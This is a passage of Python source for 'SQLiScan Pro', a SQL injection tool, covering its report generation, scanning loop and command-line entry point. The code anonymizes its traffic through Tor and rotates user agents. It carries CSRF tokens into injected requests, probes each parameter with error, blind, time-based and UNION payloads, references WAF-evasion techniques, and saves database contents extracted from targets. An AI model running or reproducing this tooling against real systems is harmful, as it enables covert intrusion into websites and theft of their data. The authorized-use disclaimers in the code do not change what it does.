                pre { background-color: #f2f2f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85em; white-space: pre-wrap; word-break: break-all; }
                ul { list-style-type: disc; margin-left: 25px; }
                li { margin-bottom: 8px; }
                .disclaimer { font-size: 0.8em; color: #777; margin-top: 30px; border-top: 1px dashed #e0e0e0; padding-top: 15px; text-align: center;}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>SQLiScan Pro Report</h1>
                    <p>Generated: {{ report_data.start_time }}</p>
                </div>
                
                <div class="info">
                    <h2>Scan Summary</h2>
                    <table>
                        <tr><th>Target URL</th><td>{{ report_data.target }}</td></tr>
                        <tr><th>Request Method</th><td>{{ report_data.request_method|upper }}</td></tr>
                        <tr><th>DBMS Detected</th><td>{{ report_data.dbms|upper }}</td></tr>
                        <tr><th>Vulnerable</th><td>{{ 'Yes' if report_data.vulnerabilities else 'No' }}</td></tr>
                        <tr><th>Scan Duration</th><td>{{ report_data.scan_duration }} seconds</td></tr>
                        <tr><th>Total Payloads Generated</th><td>{{ report_data.payloads_generated }}</td></tr>
                        <tr><th>Tor Enabled</th><td>{{ 'Yes' if report_data.tor_enabled else 'No' }}</td></tr>
                    </table>
                </div>
                
                {% if report_data.vulnerabilities %}
                <div class="vulnerability">
                    <h2>Vulnerabilities Found ({{ report_data.vulnerabilities|length }})</h2>
                    <table>
                        <tr><th>#</th><th>Type</th><th>Parameter</th><th>Payload</th><th>Details</th></tr>
                        {% for vuln in report_data.vulnerabilities %}
                        <tr>
                            <td>{{ loop.index }}</td>
                            <td><code>{{ vuln.type }}</code></td>
                            <td><code>{{ vuln.parameter }}</code></td>
                            <td><pre>{{ vuln.payload }}</pre></td>
                            <td>{{ vuln.details }}</td>
                        </tr>
                        {% endfor %}
                    </table>
                </div>
                {% endif %}
                
                {% if report_data.extracted_data %}
                <div class="vulnerability">
                    <h2>Extracted Data (UNION-based)</h2>
                    {% for key, data_list in report_data.extracted_data.items() %}
                        <h3>{{ key|replace('_', ' ')|title }}</h3>
                        <pre>{% for item in data_list %}{{ item }}{% if not loop.last %}, {% endif %}{% endfor %}</pre>
                    {% endfor %}
                </div>
                {% endif %}
                
                <div class="{% if report_data.vulnerabilities %}vulnerability{% else %}success{% endif %}">
                    <h2>Recommendations</h2>
                    <ul>
                        {% if report_data.vulnerabilities %}
                        <li><strong>Input Sanitization & Parameterized Queries:</strong> Immediately sanitize all user inputs and implement parameterized queries (prepared statements) for all database interactions. This is the most effective defense.</li>
                        <li><strong>Least Privilege:</strong> Ensure that the database user account used by the web application has only the minimum necessary privileges to perform its functions.</li>
                        <li><strong>Error Handling:</strong> Implement generic error pages. Do not display verbose database error messages or internal system errors to users, as these can leak critical information.</li>
                        <li><strong>Web Application Firewall (WAF):</strong> Deploy and configure a WAF with up-to-date SQL injection rules. While not foolproof, a WAF adds an important layer of defense.</li>
                        <li><strong>Regular Security Audits:</strong> Conduct frequent code reviews, penetration tests, and vulnerability assessments as part of your development lifecycle.</li>
                        {% else %}
                        <li>Continue regular security scanning as part of your development lifecycle.</li>
                        <li>Ensure all systems, frameworks, and dependencies are kept up to date.</li>
                        <li>Consider implementing a Web Application Firewall (WAF) for defense in depth.</li>
                        <li>Follow secure coding best practices for all new development, focusing on input validation and parameterized queries.</li>
                        {% endif %}
                    </ul>
                </div>
                <div class="disclaimer">
                    This report is for educational and authorized testing purposes only. Do not use this tool on systems you do not have explicit permission to test.
                </div>
            </div>
        </body>
        </html>
        """
        
        template = Template(template_str)
        return template.render(report_data=self.report_data)
    
    def save_report(self, report_type: str = "html") -> str:
        report_filename_base = f"sqliscan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        if report_type == "html":
            html_content = self._generate_html_report()
            filename = f"{report_filename_base}.html"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            logger.info(f"HTML report saved to: {filename}")
            
            if platform.system() == "Linux" or (platform.system() == "Windows" and os.path.exists("C:\\Program Files\\wkhtmltopdf\\bin\\wkhtmltopdf.exe")):
                try:
                    pdf_filename = f"{report_filename_base}.pdf"
                    options = {'enable-local-file-access': None}
                    pdfkit.from_string(html_content, pdf_filename, options=options)
                    logger.info(f"PDF report saved to: {pdf_filename}")
                except Exception as e:
                    logger.warning(f"Could not generate PDF report. Make sure wkhtmltopdf is installed and in your PATH. Error: {e}")
            else:
                logger.warning("PDF report generation skipped. wkhtmltopdf is required for PDF reports.")
            
            return filename
        
        elif report_type == "json":
            filename = f"{report_filename_base}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.report_data, f, indent=2)
            logger.info(f"JSON report saved to: {filename}")
            return filename
        
        elif report_type == "txt":
            filename = f"{report_filename_base}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"SQLiScan Pro Report\n")
                f.write(f"Generated: {self.report_data['start_time']}\n")
                f.write(f"Target URL: {self.report_data['target']}\n")
                f.write(f"Request Method: {self.report_data['request_method'].upper()}\n")
                f.write(f"DBMS Detected: {self.report_data['dbms'].upper()}\n")
                f.write(f"Vulnerable: {'Yes' if self.report_data['vulnerabilities'] else 'No'}\n")
                f.write(f"Scan Duration: {self.report_data['scan_duration']} seconds\n")
                f.write(f"Total Payloads Generated: {self.report_data['payloads_generated']}\n")
                f.write(f"Tor Enabled: {'Yes' if self.report_data['tor_enabled'] else 'No'}\n\n")
                
                if self.report_data['vulnerabilities']:
                    f.write("Vulnerabilities Found:\n")
                    for i, vuln in enumerate(self.report_data['vulnerabilities'], 1):
                        f.write(f"{i}. Type: {vuln['type']}\n")
                        f.write(f"   Parameter: {vuln['parameter']}\n")
                        f.write(f"   Payload: {vuln['payload']}\n")
                        f.write(f"   Details: {vuln['details']}\n\n")

                if self.report_data.get('extracted_data'):
                    f.write("\nExtracted Data (UNION-based):\n")
                    for key, data_list in self.report_data['extracted_data'].items():
                        f.write(f"  {key.replace('_', ' ').title()}:\n")
                        f.write(f"    {', '.join(data_list)}\n")
                
                f.write("\nRecommendations:\n")
                if self.report_data['vulnerabilities']:
                    f.write("- Immediately sanitize all user inputs and implement parameterized queries (prepared statements) for all database interactions.\n")
                    f.write("- Ensure that the database user account used by the web application has only the minimum necessary privileges.\n")
                    f.write("- Implement generic error pages. Do not display verbose database error messages to users.\n")
                    f.write("- Deploy and configure a Web Application Firewall (WAF) with up-to-date SQL injection rules.\n")
                    f.write("- Conduct frequent code reviews and penetration tests.\n")
                else:
                    f.write("- Continue regular security scanning as part of your development lifecycle.\n")
                    f.write("- Ensure all systems, frameworks, and dependencies are kept up to date.\n")
                    f.write("- Consider implementing a Web Application Firewall (WAF) for defense in depth.\n")
                    f.write("- Follow secure coding best practices for all new development.\n")
            logger.info(f"TXT report saved to: {filename}")
            return filename
        
        else:
            logger.error(f"Unsupported report type: {report_type}. Saving as HTML by default.")
            return self.save_report("html")

class SQLiScannerPro:
    def __init__(self, target_url: str, request_method: str = "GET", post_data: Optional[Dict] = None,
                 proxies: Optional[Dict] = None, headers: Optional[Dict] = None, 
                 payload_file: str = "payloads.json", max_concurrency: int = 10, 
                 tor_enabled: bool = False, scan_timeout: int = 300, 
                 blind_sqli_delay: float = 5, verbose: bool = False):
        
        if not self._is_valid_url(target_url):
            raise ValueError(f"Invalid target URL: {target_url}")

        self.target_url = target_url
        self.request_method = request_method.upper()
        self.post_data = post_data if post_data else {}
        self.headers = headers if headers else {'User-Agent': random.choice(DEFAULT_USER_AGENTS)}
        self.proxies = proxies if proxies else {}
        self.payload_file = payload_file
        self.max_concurrency = max_concurrency
        self.tor_enabled = tor_enabled
        self.dbms = "unknown"
        self.vulnerabilities = []
        self.scan_timeout = scan_timeout 
        self.blind_sqli_delay = blind_sqli_delay 
        self.csrf_token_name = None
        self.csrf_token_value = None
        self.exploit_engine = ExploitEngine()
        
        if verbose:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)

        self.payload_manager = PayloadManager(payload_file=self.payload_file)
        self.detection_engine = DetectionEngine()
        self.request_handler = RequestHandler(headers=self.headers, proxies=self.proxies, timeout=self.scan_timeout/len(self._get_all_params_to_test()) if self._get_all_params_to_test() else 15)

        self.report_data = {
            'target': target_url,
            'request_method': self.request_method,
            'start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': self.vulnerabilities,
            'dbms': 'unknown',
            'scan_duration': 0,
            'payloads_generated': 0, 
            'tor_enabled': self.tor_enabled,
            'extracted_data': None,
            'scan_id': os.urandom(4).hex() 
        }
        
        self.original_socket_socket = None
        if self.tor_enabled:
            self._setup_tor_proxy()
    
    def _is_valid_url(self, url: str) -> bool:
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except ValueError:
            return False

    def _setup_tor_proxy(self):
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        self.request_handler.proxies = self.proxies

        try:
            self.original_socket_socket = socket.socket
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            
            test_ip = self._get_tor_ip()
            if test_ip:
                logger.info_plus(f"Tor connection successful. Current IP: {test_ip}")
            else:
                logger.warning("Tor connection failed or IP not detected. Disabling Tor proxy.")
                self._disable_tor_proxy()
        except Exception as e:
            logger.error(f"Error setting up Tor proxy: {e}. Disabling Tor proxy.")
            self._disable_tor_proxy()

    def _disable_tor_proxy(self):
        self.tor_enabled = False
        self.proxies = {}
        self.request_handler.proxies = {}
        if self.original_socket_socket:
            socket.socket = self.original_socket_socket
            self.original_socket_socket = None

    def _get_tor_ip(self):
        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=10, proxies=self.proxies)
            return response.json().get('ip', '')
        except Exception:
            return None
            
    def _get_all_params_to_test(self) -> List[str]:
        parsed = urlparse(self.target_url)
        query_params = parse_qs(parsed.query)
        
        params = list(query_params.keys())
        if self.request_method == "POST":
            params.extend(list(self.post_data.keys()))
        
        common_params_priority = ["id", "uid", "user", "name", "cat", "category", "p", "q", "query", "search", "title"]
        
        prioritized_params = []
        other_params = []
        for param in list(set(params)):
            if param.lower() in common_params_priority:
                prioritized_params.append(param)
            else:
                other_params.append(param)
        
        prioritized_params.sort(key=lambda p: common_params_priority.index(p.lower()) if p.lower() in common_params_priority else float('inf'))
        
        return prioritized_params + other_params

    def _extract_csrf_token(self, content: str) -> Tuple[Optional[str], Optional[str]]:
        csrf_patterns = [
            r'<input[^>]+name=["\']?(_token|csrf_token|authenticity_token|__RequestVerificationToken)["\']?[^>]+value=["\']?([a-zA-Z0-9_-]+)["\']?',
            r'meta[^>]+name=["\']?(csrf-token|csrf_token)["\']?[^>]+content=["\']?([a-zA-Z0-9_-]+)["\']?',
            r'var\s+(CSRF_TOKEN|csrfToken)\s*=\s*["\']([a-zA-Z0-9_-]+)["\']'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                logger.debug(f"CSRF token found: {match.group(1)} = {match.group(2)}")
                return match.group(1), match.group(2)
        return None, None

    async def scan_all_params_async(self):
        start_time = time.time()
        
        parsed = urlparse(self.target_url)
        original_query_params = parse_qs(parsed.query)
        
        initial_request_params = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in original_query_params.items()}
        initial_request_data = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in self.post_data.items()} if self.request_method == "POST" else {}

        async with aiohttp.ClientSession(headers=self.headers, trust_env=True) as session:
            logger.info("Sending initial request to get base response and extract CSRF tokens...")
            base_response = await self.request_handler.send_async_request(
                session, self.target_url, self.request_method, 
                params=initial_request_params, data=initial_request_data
            )
            if not base_response:
                logger.error("Failed to get base response. Cannot proceed with scan.")
                return
            
            self.csrf_token_name, self.csrf_token_value = self._extract_csrf_token(base_response['content'])
            if self.csrf_token_name and self.csrf_token_value:
                logger.info_plus(f"CSRF Token detected: {self.csrf_token_name}={self.csrf_token_value[:10]}...")

            params_to_test = self._get_all_params_to_test()
            
            if not params_to_test:
                logger.warning("No parameters found to test in the URL or POST data.")
                return
            
            self.report_data['payloads_generated'] = 0

            progress_bar = tqdm(total=len(params_to_test), desc="Scanning Parameters", unit="param", dynamic_ncols=True)

            for param in params_to_test:
                progress_bar.set_description(f"Scanning Parameter: {param}")
                
                if self.csrf_token_name and self.request_method == "POST":
                    if param == self.csrf_token_name:
                        logger.debug(f"Skipping CSRF token parameter '{param}' from direct injection test.")
                        progress_bar.update(1)
                        continue
                
                dbms_for_param = await self.detection_engine.detect_dbms_async(
                    self.request_handler, session, self.target_url, param, self.request_method, 
                    initial_request_params, initial_request_data
                )
                detected_dbms = dbms_for_param or "generic"
                if self.dbms == "unknown" and detected_dbms != "generic":
                    self.dbms = detected_dbms
                    self.report_data['dbms'] = self.dbms
                
                if detected_dbms != "generic":
                    logger.info_plus(f"Detected DBMS: {detected_dbms.upper()} for parameter '{param}'")
                
                if self.request_method == "POST" and self.csrf_token_name and self.csrf_token_value:
                    initial_request_data_with_csrf = initial_request_data.copy()
                    initial_request_data_with_csrf[self.csrf_token_name] = self.csrf_token_value
                    current_initial_data = initial_request_data_with_csrf
                else:
                    current_initial_data = initial_request_data

                fast_test_tasks = []
                fast_test_tasks.append(
                    self.detection_engine.check_error_based_sql_async(
                        self.request_handler, session, self.target_url, param, self.request_method, 
                        initial_request_params, current_initial_data, detected_dbms, self.payload_manager
                    )
                )
                fast_test_tasks.append(
                    self.detection_engine.check_blind_sql_async(
                        self.request_handler, session, self.target_url, param, self.request_method, 
                        initial_request_params, current_initial_data, detected_dbms, base_response, self.payload_manager
                    )
                )

                fast_results = await asyncio.gather(*fast_test_tasks, return_exceptions=True) 
                
                vulnerability_found_in_fast_tests = False
                for result in fast_results:
                    if isinstance(result, Exception):
                        logger.debug(f"Error during fast SQLi check for parameter '{param}': {result}")
                        continue
                    if result:
                        self.vulnerabilities.append(result)
                        logger.success(f"Vulnerability found: {result['type']} on parameter '{result['parameter']}'")
                        vulnerability_found_in_fast_tests = True
                        break

                if not vulnerability_found_in_fast_tests:
                    slow_test_tasks = []
                    slow_test_tasks.append(
                        self.detection_engine.check_time_based_sql_async(
                            self.request_handler, session, self.target_url, param, self.request_method, 
                            initial_request_params, current_initial_data, detected_dbms, self.blind_sqli_delay, self.payload_manager
                        )
                    )
                    slow_test_tasks.append(
                        self.detection_engine.check_union_sql_async(
                            self.request_handler, session, self.target_url, param, self.request_method, 
                            initial_request_params, current_initial_data, detected_dbms, self.payload_manager
                        )
                    )
                    
                    slow_results = await asyncio.gather(*slow_test_tasks, return_exceptions=True)
                    
                    for result in slow_results:
                        if isinstance(result, Exception):
                            logger.debug(f"Error during slow SQLi check for parameter '{param}': {result}")
                            continue
                        if result:
                            self.vulnerabilities.append(result)
                            logger.success(f"Vulnerability found: {result['type']} on parameter '{result['parameter']}'")
                            if result['type'].startswith('UNION SQLi') and self.detection_engine.extracted_data:
                                if self.report_data['extracted_data'] is None:
                                    self.report_data['extracted_data'] = {}
                                self.report_data['extracted_data'].update(self.detection_engine.extracted_data)
                                self.detection_engine.extracted_data = {} 

                progress_bar.update(1)
            
            progress_bar.close()

        self.report_data['scan_duration'] = round(time.time() - start_time, 2)
        
        self.report_data['payloads_generated'] = sum(
            len(p_list) * len(self.payload_manager.waf_techniques) * 4
            for category_dict in self.payload_manager.payloads.values()
            for p_list in category_dict.values()
        )

    def run(self):
        logger.info("\n[+] Starting SQLiScan Pro")
        logger.info(f"[*] Target: {self.target_url}")
        logger.info(f"[*] Method: {self.request_method}")
        logger.info(f"[*] Max Concurrency: {self.max_concurrency}")
        logger.info(f"[*] Tor: {'Enabled' if self.tor_enabled else 'Disabled'}")
        logger.info(f"[*] Scan Timeout: {self.scan_timeout} seconds")
        logger.info(f"[*] Blind SQLi Delay: {self.blind_sqli_delay} seconds")
        logger.info(f"[*] Logging Level: {logger.level}")
        
        try:
            conn = aiohttp.TCPConnector(limit=self.max_concurrency)
            asyncio_session = aiohttp.ClientSession(headers=self.headers, connector=conn)
            
            asyncio.run(asyncio.wait_for(self.scan_all_params_async(), timeout=self.scan_timeout))
        except asyncio.TimeoutError:
            logger.error(f"Scan timed out after {self.scan_timeout} seconds.")
        except Exception as e:
            logger.critical(f"An unhandled error occurred during scan: {e}")
        finally:
            if self.tor_enabled and self.original_socket_socket:
                socket.socket = self.original_socket_socket
                logger.info("Tor proxy disabled and socket restored.")

            report_generator = ReportGenerator(self.report_data)
            report_file = report_generator.save_report("html")
            logger.info(f"\n[+] Scan completed. Report saved to: {report_file}")
            
            self._print_summary()
            logger.info("\n[!] IMPORTANT: This tool is for authorized security testing and educational purposes only. Do not use on systems you do not have explicit permission to test!")

    def _print_summary(self):
        logger.info("\n[+] Scan Summary:")
        logger.info(f"Target URL: {self.report_data['target']}")
        logger.info(f"Request Method: {self.report_data['request_method'].upper()}")
        logger.info(f"DBMS Detected: {self.report_data['dbms'].upper()}")
        logger.info(f"Vulnerable: {'Yes' if self.report_data['vulnerabilities'] else 'No'}")
        logger.info(f"Scan Duration: {self.report_data['scan_duration']} seconds")
        logger.info(f"Total Payloads Generated (Approx.): {self.report_data['payloads_generated']}")
        
        if self.report_data['vulnerabilities']:
            logger.info("\n[+] Vulnerabilities Found:")
            for i, vuln in enumerate(self.report_data['vulnerabilities'], 1):
                logger.success(f"{i}. {vuln['type']} on parameter '{vuln['parameter']}'")
                logger.info(f"   Payload: {vuln['payload']}")
                logger.info(f"   Details: {vuln['details']}")
        
        if self.report_data.get('extracted_data'):
            logger.info("\n[+] Extracted Data (UNION-based):")
            for key, data_list in self.report_data['extracted_data'].items():
                logger.info(f"  {key.replace('_', ' ').title()}: {', '.join(data_list)}")

def main():
    parser = argparse.ArgumentParser(description="SQLiScan Pro - Advanced SQL Injection Scanner.")
    parser.add_argument("-c", "--config", help="Path to a JSON configuration file.")
    parser.add_argument("-u", "--url", help="Target URL (e.g., http://testphp.vulnweb.com/listproducts.php?cat=1)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="Request method (GET or POST, default: GET)")
    parser.add_argument("-d", "--data", help="POST data (e.g., 'name=test&pass=123'). Required for POST method.")
    parser.add_argument("-t", "--tor", action="store_true", help="Use Tor proxy (requires Tor to be running on 127.0.0.1:9050)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Max concurrent requests (default: 10)")
    parser.add_argument("-p", "--payload-file", default="payloads.json", help="Path to custom payload file (default: payloads.json)")
    parser.add_argument("-s", "--timeout", type=int, default=300, help="Global scan timeout in seconds (default: 300)")
    parser.add_argument("-b", "--blind-delay", type=float, default=5.0, help="Time-based SQLi delay in seconds (default: 5.0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging (debug level)")
    parser.add_argument("-H", "--headers", help="Additional HTTP headers as JSON string (e.g., '{\"Cookie\": \"PHPSESSID=abc\"}')")

    args = parser.parse_args()

    config = {}
    if args.config:
        try:
            with open(args.config, 'r') as f:
                config = json.load(f)
            logger.info(f"Loaded configuration from {args.config}")
        except FileNotFoundError:
            logger.error(f"Configuration file not found: {args.config}")
            exit(1)
        except json.JSONDecodeError:
            logger.error(f"Error parsing configuration file: {args.config}. Invalid JSON.")
            exit(1)
    
    target_url = args.url or config.get("target_url")
    request_method = args.method or config.get("request_method", "GET")
    
    post_data = {}
    if args.data:
        try:
            post_data = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(args.data).items()}
        except Exception:
            logger.warning("Could not parse POST data from command line. Using empty POST data.")
    elif config.get("post_data"):
        if isinstance(config["post_data"], str):
            try:
                post_data = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(config["post_data"]).items()}
            except Exception:
                logger.warning("Could not parse POST data from config file. Using empty POST data.")
        else:
            post_data = config["post_data"]

    use_tor = args.tor or config.get("tor_enabled", False)
    workers = args.workers or config.get("max_concurrency", 10)
    payload_file = args.payload_file or config.get("payload_file", "payloads.json")
    scan_timeout = args.timeout or config.get("scan_timeout", 300)
    blind_sqli_delay = args.blind_delay or config.get("blind_sqli_delay", 5.0)
    verbose_logging = args.verbose or config.get("verbose", False)
    
    headers = {'User-Agent': random.choice(DEFAULT_USER_AGENTS)}
    if args.headers:
        try:
            extra_headers = json.loads(args.headers)
            headers.update(extra_headers)
        except json.JSONDecodeError:
            logger.warning("Could not parse headers from command line. Invalid JSON.")
    elif config.get("headers"):
        headers.update(config["headers"])

    if not target_url:
        logger.critical("Target URL is required. Please provide it via --url or in the config file.")
        parser.print_help()
        exit(1)

    scanner_args = {
        "target_url": target_url,
        "request_method": request_method,
        "post_data": post_data if request_method == "POST" else None,
        "tor_enabled": use_tor,
        "max_concurrency": workers,
        "headers": headers,
        "scan_timeout": scan_timeout,
        "blind_sqli_delay": blind_sqli_delay,
        "verbose": verbose_logging,
        "payload_file": payload_file
    }

    try:
        scanner = SQLiScannerPro(**scanner_args)
        scanner.run()
    except ValueError as e:
        logger.critical(f"\n[!] Configuration error: {e}. Please check your inputs.")
        exit(1)
    except KeyboardInterrupt:
        logger.info("\n[!] Scan interrupted by user. Saving partial report...\n")
        report_generator = ReportGenerator(scanner.report_data)
        report_generator.save_report("html")
        logger.info("[+] Partial report saved.")
    except Exception as e:
        logger.critical(f"\n[!] Critical error during scan: {e}")
        logger.info("[!] Attempting to save partial report...\n")
        report_generator = ReportGenerator(scanner.report_data)
        report_generator.save_report("html")
        logger.info("[+] Partial report saved.")

if __name__ == "__main__":
    print("""
   _____ ____ _     ___    ____                 ____              
  / ___//  _// |   / _ \  / __ \___  ____  _____/ __ \___  _____ 
  \__ \ / / / /| | / ___ \/ / / / _ \/ __ \/ ___/ /_/ / _ \/ ___/
 ___/ // /_/ ___ |/ /_/ / /_/ /  __/ / / (__  ) _, _/  __/ /    
/____/___//_/  |_/____/_____/\___/_/ /_/____/_/ |_|\___/_/     
    SQL Injection Scanner Pro (GOD MODE)
    """)
    main()